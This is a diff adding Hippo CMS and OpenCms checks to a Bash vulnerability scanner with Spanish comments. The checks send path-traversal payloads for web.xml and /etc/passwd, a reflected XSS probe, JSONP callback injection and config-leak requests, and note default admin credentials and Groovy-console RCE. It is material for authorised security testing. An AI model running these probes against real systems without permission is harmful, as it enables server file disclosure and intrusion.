+          "${HANDLER_BASE}?${PARAM_NAME}=${PAYLOAD}" 2>/dev/null)
+        TRAV_BODY=$(cat /tmp/.ashx_$$ 2>/dev/null | head -c 500)
+
+        # Confirmar si devuelve contenido de web.config
+        if echo "$TRAV_BODY" | grep -qi "connectionString\|appSettings\|system.web\|machineKey"; then
+          _cms_finding "$DOMAIN_ID" "$DOMAIN" "${HANDLER_BASE}?${PARAM_NAME}=${PAYLOAD}" \
+            "ASP.NET Handler Path Traversal" "critical" \
+            "Path traversal en .ashx — expone web.config con posibles credenciales DB/machineKey: ${PARAM_NAME}=${PAYLOAD}" "aspnet_traversal"
+          break
+        fi
+      done
+    done
+
+    rm -f /tmp/.trace_$$ /tmp/.elmah_$$ /tmp/.ashx_$$
+  done <<< "$SUBS"
+}
+
+# ── Hippo CMS / Bloomreach Experience Manager ─────────────────
+_scan_hippo() {
+  local DOMAIN_ID="$1" DOMAIN="$2" OUT_DIR="$3"
+
+  # Detección: path /web/.content/ indexado, o tech_name Hippo/Bloomreach/brXM
+  local SUBS
+  SUBS=$(sqlite3 "$DB_PATH" \
+    "SELECT DISTINCT subdomain FROM technologies
+     WHERE domain_id=${DOMAIN_ID}
+       AND (tech_name LIKE '%Hippo%' OR tech_name LIKE '%Bloomreach%'
+            OR tech_name LIKE '%brXM%')
+     UNION
+     SELECT DISTINCT s.subdomain FROM subdomains s
+     WHERE s.domain_id=${DOMAIN_ID} AND s.status='alive'
+       AND EXISTS (
+         SELECT 1 FROM urls u WHERE u.domain_id=s.domain_id
+           AND (u.url LIKE '%/web/.content/%' OR u.url LIKE '%/cms/login%'
+                OR u.url LIKE '%/cms/repository%')
+       )
+     UNION
+     SELECT subdomain FROM subdomains
+     WHERE domain_id=${DOMAIN_ID} AND status='alive';" 2>/dev/null)
+
+  [[ -z "$SUBS" ]] && return
+
+  source "${SCRIPT_DIR}/core/proxy.sh" 2>/dev/null || true
+  proxy_check
+  local CURL_PROXY=""
+  $PROXY_ACTIVE && CURL_PROXY="--proxy ${PROXY_URL}"
+
+  while IFS= read -r SUB; do
+    [[ -z "$SUB" ]] && continue
+    local BASE="https://${SUB}"
+    log_info "  Hippo CMS scan → $BASE"
+
+    # ── Panel admin /cms/ ──────────────────────────────────────
+    local CMS_STATUS CMS_BODY
+    CMS_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 ${CURL_PROXY} \
+      -o /tmp/.hippo_cms_$$ -w "%{http_code}" "${BASE}/cms/" 2>/dev/null)
+    CMS_BODY=$(cat /tmp/.hippo_cms_$$ 2>/dev/null | head -c 2000)
+    if [[ "$CMS_STATUS" == "200" || "$CMS_STATUS" == "302" ]]; then
+      if echo "$CMS_BODY" | grep -qi "Hippo\|Bloomreach\|brXM\|hippo-login\|cms-login"; then
+        _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}/cms/" \
+          "Hippo CMS Admin Panel Exposed" "high" \
+          "Panel de administración Hippo CMS accesible desde internet — brute force o credential stuffing aplicable. Default creds: admin/admin" "hippo_admin"
+      fi
+    fi
+
+    # ── /cms/login (login form directo) ───────────────────────
+    local LOGIN_STATUS LOGIN_BODY
+    LOGIN_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 ${CURL_PROXY} \
+      -o /tmp/.hippo_login_$$ -w "%{http_code}" -L "${BASE}/cms/login" 2>/dev/null)
+    LOGIN_BODY=$(cat /tmp/.hippo_login_$$ 2>/dev/null | head -c 2000)
+    if [[ "$LOGIN_STATUS" == "200" ]]; then
+      if echo "$LOGIN_BODY" | grep -qi "hippo\|bloomreach\|wicket\|login.*cms\|cms.*login"; then
+        _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}/cms/login" \
+          "Hippo CMS Login Page Exposed" "medium" \
+          "Página de login del CMS accesible — verificar si panel /cms/ también es accesible" "hippo_login"
+      fi
+    fi
+
+    # ── Repositorio JCR expuesto ───────────────────────────────
+    local JCR_STATUS JCR_BODY
+    JCR_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 ${CURL_PROXY} \
+      -o /tmp/.hippo_jcr_$$ -w "%{http_code}" "${BASE}/cms/repository" 2>/dev/null)
+    JCR_BODY=$(cat /tmp/.hippo_jcr_$$ 2>/dev/null | head -c 2000)
+    if [[ "$JCR_STATUS" == "200" ]]; then
+      if echo "$JCR_BODY" | grep -qi "jcr\|repository\|hippo\|node"; then
+        _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}/cms/repository" \
+          "Hippo CMS JCR Repository Exposed" "high" \
+          "Repositorio JCR (Java Content Repository) de Hippo CMS accesible — puede exponer estructura interna y contenido no publicado" "hippo_jcr"
+      fi
+    fi
+
+    # ── /web/.content/ — enumeración de directorio ────────────
+    local WEB_STATUS WEB_BODY
+    WEB_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 ${CURL_PROXY} \
+      -o /tmp/.hippo_web_$$ -w "%{http_code}" "${BASE}/web/.content/" 2>/dev/null)
+    WEB_BODY=$(cat /tmp/.hippo_web_$$ 2>/dev/null | head -c 2000)
+    if [[ "$WEB_STATUS" == "200" ]]; then
+      if echo "$WEB_BODY" | grep -qi "Index of\|<a href\|\.content"; then
+        _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}/web/.content/" \
+          "Hippo CMS Content Repository Directory Listing" "medium" \
+          "Listado de directorio en /web/.content/ — enumerar documentos no publicados y estructura del CMS" "hippo_content_listing"
+      fi
+    fi
+
+    # ── Path traversal desde /web/.content/ ───────────────────
+    # Intentar salir del content repo hacia /WEB-INF/
+    for TRAV in "../WEB-INF/web.xml" "../../WEB-INF/web.xml" \
+                "../../../WEB-INF/web.xml" "%2e%2e%2fWEB-INF%2fweb.xml"; do
+      local TRAV_STATUS TRAV_BODY
+      TRAV_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 ${CURL_PROXY} \
+        -o /tmp/.hippo_trav_$$ -w "%{http_code}" \
+        "${BASE}/web/.content/${TRAV}" 2>/dev/null)
+      TRAV_BODY=$(cat /tmp/.hippo_trav_$$ 2>/dev/null | head -c 1000)
+      if echo "$TRAV_BODY" | grep -qi "web-app\|servlet\|display-name\|WEB-INF"; then
+        _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}/web/.content/${TRAV}" \
+          "Hippo CMS Path Traversal to WEB-INF" "critical" \
+          "Path traversal desde /web/.content/ alcanza WEB-INF/web.xml — puede exponer configuración interna, credenciales y estructura de la app" "hippo_traversal"
+        break
+      fi
+    done
+
+    # ── CVE-2020-14987: RCE via template injection (brXM pre-14.3) ─
+    # Test: acceder a /cms/console y verificar si permite ejecución de Groovy
+    local CONSOLE_STATUS CONSOLE_BODY
+    CONSOLE_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 ${CURL_PROXY} \
+      -o /tmp/.hippo_console_$$ -w "%{http_code}" "${BASE}/cms/console" 2>/dev/null)
+    CONSOLE_BODY=$(cat /tmp/.hippo_console_$$ 2>/dev/null | head -c 2000)
+    if [[ "$CONSOLE_STATUS" == "200" ]]; then
+      # Require Hippo-specific indicators — plain "script" matches SPA index.html false positive
+      if echo "$CONSOLE_BODY" | grep -qi "hippo\|bloomreach\|wicket\|groovy.console\|Execute Script\|<title>.*CMS\|cms-console"; then
+        _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}/cms/console" \
+          "Hippo CMS Groovy Console Exposed (CVE-2020-14987)" "critical" \
+          "Consola Groovy de Hippo CMS accesible sin autenticación — RCE directo (CVE-2020-14987). Explotar: ejecutar comandos OS via Groovy" "hippo_rce"
+      fi
+    fi
+
+    # ── XSS en Repository Servlet (Hippo Security-22) ─────────
+    local XSS_STATUS XSS_BODY XSS_PAYLOAD="<script>alert(1)</script>"
+    XSS_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 ${CURL_PROXY} \
+      -o /tmp/.hippo_xss_$$ -w "%{http_code}" \
+      "${BASE}/cms/repository?path=/${XSS_PAYLOAD}" 2>/dev/null)
+    XSS_BODY=$(cat /tmp/.hippo_xss_$$ 2>/dev/null | head -c 2000)
+    if echo "$XSS_BODY" | grep -qF "$XSS_PAYLOAD"; then
+      _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}/cms/repository" \
+        "Hippo CMS Repository Servlet XSS (Security-22)" "medium" \
+        "XSS reflejado en /cms/repository via parámetro path — Hippo Security Advisory 22" "hippo_xss"
+    fi
+
+    rm -f /tmp/.hippo_cms_$$ /tmp/.hippo_login_$$ /tmp/.hippo_jcr_$$ \
+          /tmp/.hippo_web_$$ /tmp/.hippo_trav_$$ /tmp/.hippo_console_$$ /tmp/.hippo_xss_$$
+  done <<< "$SUBS"
+}
+
+# ── OpenCms (VASS WCM) ────────────────────────────────────────
+_scan_opencms() {
+  local DOMAIN_ID="$1" DOMAIN="$2" OUT_DIR="$3"
+
+  # Detección: path /system/modules/ en URLs, o tech OpenCms/VASS
+  local SUBS
+  SUBS=$(sqlite3 "$DB_PATH" \
+    "SELECT DISTINCT subdomain FROM technologies
+     WHERE domain_id=${DOMAIN_ID}
+       AND (tech_name LIKE '%OpenCms%' OR tech_name LIKE '%opencms%')
+     UNION
+     SELECT DISTINCT s.subdomain FROM subdomains s
+     WHERE s.domain_id=${DOMAIN_ID} AND s.status='alive'
+       AND EXISTS (
+         SELECT 1 FROM urls u WHERE u.domain_id=s.domain_id
+           AND (u.url LIKE '%/system/modules/%'
+                OR u.url LIKE '%/opencms/%'
+                OR u.url LIKE '%/system/workplace/%'
+                OR u.url LIKE '%.vass.wcm%')
+       );" 2>/dev/null)
+
+  [[ -z "$SUBS" ]] && return
+
+  source "${SCRIPT_DIR}/core/proxy.sh" 2>/dev/null || true
+  proxy_check
+  local CURL_PROXY=""
+  $PROXY_ACTIVE && CURL_PROXY="--proxy ${PROXY_URL}"
+
+  while IFS= read -r SUB; do
+    [[ -z "$SUB" ]] && continue
+    local BASE="https://${SUB}"
+    log_info "  OpenCms scan → $BASE"
+
+    # ── Panel admin: /system/workplace/ ───────────────────────
+    local WP_STATUS WP_BODY
+    WP_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 ${CURL_PROXY} \
+      -o /tmp/.ocms_wp_$$ -w "%{http_code}" -L "${BASE}/system/workplace/" 2>/dev/null)
+    WP_BODY=$(cat /tmp/.ocms_wp_$$ 2>/dev/null | head -c 2000)
+    if [[ "$WP_STATUS" == "200" ]]; then
+      if echo "$WP_BODY" | grep -qi "opencms\|workplace\|login.*opencms\|OpenCms"; then
+        _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}/system/workplace/" \
+          "OpenCms Workplace Admin Panel Exposed" "high" \
+          "Panel de administración OpenCms accesible — brute force o credential stuffing. Default: Admin/admin" "opencms_admin"
+      fi
+    fi
+
+    # ── Login page: /opencms/opencms/system/workplace/ ────────
+    for LOGIN_PATH in "/opencms/opencms/system/workplace/" \
+                      "/system/login" "/opencms/login" \
+                      "/opencms/opencms/login"; do
+      local L_STATUS L_BODY
+      L_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 ${CURL_PROXY} \
+        -o /tmp/.ocms_login_$$ -w "%{http_code}" -L "${BASE}${LOGIN_PATH}" 2>/dev/null)
+      L_BODY=$(cat /tmp/.ocms_login_$$ 2>/dev/null | head -c 2000)
+      if [[ "$L_STATUS" == "200" ]]; then
+        if echo "$L_BODY" | grep -qi "opencms\|OpenCms\|workplace\|ocLogin"; then
+          _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${LOGIN_PATH}" \
+            "OpenCms Login Page Exposed" "medium" \
+            "Página de login de OpenCms accesible desde internet" "opencms_login"
+          break
+        fi
+      fi
+    done
+
+    # ── Versión expuesta via manifest o recursos ───────────────
+    for VER_PATH in "/opencms/opencms/system/workplace/resources/commons/version.txt" \
+                    "/system/modules/org.opencms.workplace/resources/system/workplace/version.txt" \
+                    "/opencms/export/system/workplace/resources/commons/version.txt"; do
+      local V_STATUS V_BODY
+      V_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 6 ${CURL_PROXY} \
+        -o /tmp/.ocms_ver_$$ -w "%{http_code}" "${BASE}${VER_PATH}" 2>/dev/null)
+      V_BODY=$(cat /tmp/.ocms_ver_$$ 2>/dev/null | head -c 500)
+      if [[ "$V_STATUS" == "200" && -n "$V_BODY" ]]; then
+        _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${VER_PATH}" \
+          "OpenCms Version Disclosure" "info" \
+          "Versión de OpenCms expuesta: ${V_BODY:0:100}" "opencms_version"
+        break
+      fi
+    done
+
+    # ── JSONP callback injection en JSP modules ────────────────
+    # Buscar JSPs con parámetro callback en la DB (twitterCache.jsp, etc.)
+    local JSP_CALLBACKS
+    JSP_CALLBACKS=$(sqlite3 "$DB_PATH" \
+      "SELECT DISTINCT url FROM urls
+       WHERE domain_id=${DOMAIN_ID}
+         AND url LIKE '%.jsp%callback=%'
+       LIMIT 10;" 2>/dev/null)
+
+    while IFS= read -r JSP_URL; do
+      [[ -z "$JSP_URL" ]] && continue
+      # Inyectar payload en callback — si se refleja sin sanitizar → XSS
+      local CB_BASE CB_PARAMS CB_INJECT
+      CB_BASE=$(echo "$JSP_URL" | grep -oP 'https?://[^?]+')
+      CB_PARAMS=$(echo "$JSP_URL" | grep -oP '\?.*' | sed 's/callback=[^&]*/callback=alert_xss_test/')
+      CB_INJECT="${CB_BASE}${CB_PARAMS:-?callback=alert_xss_test}"
+
+      local CB_STATUS CB_BODY
+      CB_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 ${CURL_PROXY} \
+        -o /tmp/.ocms_cb_$$ -w "%{http_code}" "$CB_INJECT" 2>/dev/null)
+      CB_BODY=$(cat /tmp/.ocms_cb_$$ 2>/dev/null | head -c 1000)
+
+      if echo "$CB_BODY" | grep -q "alert_xss_test"; then
+        _cms_finding "$DOMAIN_ID" "$DOMAIN" "$CB_INJECT" \
+          "OpenCms JSP JSONP Callback Injection (XSS)" "high" \
+          "El parámetro callback no está sanitizado en ${CB_BASE} — JSONP XSS reflejado" "opencms_jsonp_xss"
+      fi
+    done <<< "$JSP_CALLBACKS"
+
+    # ── Path traversal en VFS export ──────────────────────────
+    for TRAV in "/opencms/export/..%2f..%2fetc/passwd" \
+                "/system/modules/..%2f..%2fWEB-INF/web.xml" \
+                "/opencms/opencms/..%2f..%2fWEB-INF/web.xml"; do
+      local TR_STATUS TR_BODY
+      TR_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 ${CURL_PROXY} \
+        -o /tmp/.ocms_tr_$$ -w "%{http_code}" "${BASE}${TRAV}" 2>/dev/null)
+      TR_BODY=$(cat /tmp/.ocms_tr_$$ 2>/dev/null | head -c 1000)
+      if echo "$TR_BODY" | grep -qi "root:x\|web-app\|servlet\|WEB-INF"; then
+        _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${TRAV}" \
+          "OpenCms Path Traversal" "critical" \
+          "Path traversal en OpenCms — acceso a ficheros del servidor: ${TRAV}" "opencms_traversal"
+        break
+      fi
+    done
+
+    # ── Exposición de cookieConfig.json u otros configs ────────
+    for CFG in "/web/.content/administratiu/cookies/cookieConfig.json" \
+               "/.content/administratiu/cookies/cookieConfig.json" \
+               "/system/modules/org.opencms.configuration/opencms-configuration.xml"; do
+      local CFG_STATUS
+      CFG_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 6 ${CURL_PROXY} \
+        -o /tmp/.ocms_cfg_$$ -w "%{http_code}" "${BASE}${CFG}" 2>/dev/null)
+      if [[ "$CFG_STATUS" == "200" ]]; then
+        local CFG_BODY
+        CFG_BODY=$(cat /tmp/.ocms_cfg_$$ 2>/dev/null | head -c 500)
+        if echo "$CFG_BODY" | grep -qi "password\|secret\|apiKey\|database\|connectionString"; then
+          _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${CFG}" \
+            "OpenCms Config File Exposed with Sensitive Data" "high" \
+            "Fichero de configuración accesible con posibles credenciales: ${CFG}" "opencms_config_leak"
+        elif [[ -n "$CFG_BODY" ]]; then
+          _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${CFG}" \
+            "OpenCms Config File Exposed" "info" \
+            "Fichero de configuración accesible: ${CFG}" "opencms_config"
+        fi
+      fi
+    done
+
+    # ── Nuclei: tags opencms + java ────────────────────────────
+    if command -v nuclei &>/dev/null; then
+      nuclei -u "${BASE}" \
+        -tags "opencms,java,tomcat,jndi,log4j" \
+        -severity "medium,high,critical" \
+        -silent -jsonl 2>/dev/null | \
+      while IFS= read -r LINE; do
+        [[ -z "$LINE" ]] && continue
+        local TMPL SEV HOST
+        TMPL=$(echo "$LINE" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('template-id','?'))" 2>/dev/null)
+        SEV=$(echo "$LINE"  | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('info',{}).get('severity','medium'))" 2>/dev/null)
+        HOST=$(echo "$LINE" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('matched-at',d.get('host','?')))" 2>/dev/null)
+        log_warn "  ⚡ OpenCms nuclei: $HOST [$TMPL]"
+        _cms_finding "$DOMAIN_ID" "$DOMAIN" "$HOST" \
+          "OpenCms/Java finding: $TMPL" "$SEV" \
+          "Nuclei template: $TMPL" "nuclei:$TMPL"
+      done
+    fi
+
+    rm -f /tmp/.ocms_wp_$$ /tmp/.ocms_login_$$ /tmp/.ocms_ver_$$ \
+          /tmp/.ocms_cb_$$ /tmp/.ocms_tr_$$ /tmp/.ocms_cfg_$$
+  done <<< "$SUBS"
+}
+
 # ── Función principal ─────────────────────────────────────────
 module_run() {
   local DOMAIN="$1"
@@ -888,6 +1677,11 @@ module_run() {
   _scan_spring         "$DOMAIN_ID" "$DOMAIN" "$OUT_DIR"
   _scan_apache_struts  "$DOMAIN_ID" "$DOMAIN" "$OUT_DIR"
   _scan_react2shell    "$DOMAIN_ID" "$DOMAIN" "$OUT_DIR"
+  _scan_hybris         "$DOMAIN_ID" "$DOMAIN" "$OUT_DIR"
+  _scan_sharepoint     "$DOMAIN_ID" "$DOMAIN" "$OUT_DIR"
+  _scan_aspnet         "$DOMAIN_ID" "$DOMAIN" "$OUT_DIR"
+  _scan_hippo          "$DOMAIN_ID" "$DOMAIN" "$OUT_DIR"
+  _scan_opencms        "$DOMAIN_ID" "$DOMAIN" "$OUT_DIR"
 
   # Log4Shell siempre — afecta a cualquier app Java
   _scan_log4shell      "$DOMAIN_ID" "$DOMAIN" "$OUT_DIR"
